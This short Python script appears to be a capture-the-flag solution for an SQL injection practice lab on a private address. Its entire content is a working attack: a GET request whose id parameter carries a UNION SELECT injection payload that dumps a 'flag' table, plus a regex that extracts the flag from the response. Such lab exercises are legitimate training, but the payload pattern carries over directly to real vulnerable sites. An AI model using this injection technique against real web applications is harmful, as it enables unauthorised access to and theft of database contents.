import requests
import re

url = "http://192.168.5.12:8082/Less-2/?id=-1 union select 1,group_concat(flag),3 from flag--"

resp = requests.get(
    url,
    timeout=10
    )

data = resp.text

m = re.search(r"(flag{.*?})", data)
flag = None
if m:
    flag = m.group(1).strip()

print(flag)
